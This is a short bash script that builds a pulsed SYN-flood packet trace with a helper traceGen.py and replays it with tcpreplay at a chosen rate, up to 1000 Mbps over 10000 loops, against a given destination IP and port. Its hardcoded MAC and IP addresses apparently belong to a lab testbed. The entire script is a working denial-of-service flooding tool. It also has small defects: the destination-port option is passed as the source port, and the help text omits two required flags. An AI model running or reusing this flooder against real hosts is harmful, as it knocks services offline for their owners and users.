#!/bin/bash

pktLen=100
while [ -n "$1" ]
do
    case "$1" in
        -m) rate=$2
            shift;; 
        -s) floodPeriod=$2
            shift;;
        -r) restPeriod=$2
            shift;;
        -i) interface=$2
            shift;;
        -l) pktLen=$2
            shift;;
        -a) dstIP=$2
            shift;;
        -p) dstPort=$2
            shift;;
        -h) echo "This script has the following opetions:"
            echo ""
            echo "    -m speed: the speed of floods in Mbps"
            echo "    -s time: the duration of flooding in seconds"
            echo "    -r time: the duration of rest time(not flooding) in seconds"
            echo "    -i eno1: the interface which the flooding traffic is sent from"
            echo "    -l length: the length of each pkt, by default is 100"
            exit;;
    esac
    shift
done

if [ -z "$rate" ] || [ -z "$floodPeriod" ] || [ -z "$restPeriod" ] || [ -z "$interface" ] || [ -z "$dstIP" ] || [ -z "$dstPort" ]
then
    echo "please input -m -s -r -i -a -p parameters"
    exit
fi

floodPktNum=$(echo "$rate * 1000000 * $floodPeriod / 8 / $pktLen" | bc)
nonFloodPktNum=$(echo "$rate * 1000000 * $restPeriod / 8 / $pktLen" | bc)
traceName="SYN_flooding_${floodPktNum}_${nonFloodPktNum}_${pktLen}_${dstIP}_${dstPort}.pcap"
if [ ! -e $traceName ]
then
    echo "trace not found, generating trace"
    ./traceGen.py --pktNum=$floodPktNum --pktLen=$pktLen \
    --srcMac=14:18:77:51:43:06 --dstMac=14:18:77:54:2e:4c \
    --srcIP=101.6.30.132 --dstIP=$dstIP --srcPort=$dstPort --dstPort=80 \
    --nonPulsePktNum=$nonFloodPktNum --nonPulsePktLen=1000 \
    --nonPulsePktDstMac=14:18:77:53:4e:ef --nonPulsePktDstIP=101.6.30.137 --nonPulsePktDstPort=80 \
    --outputFile=$traceName 
else
    echo "trace is found"
fi

echo "start flooding"
tcpreplay -i $interface -M 1000 -K -l 10000 $traceName
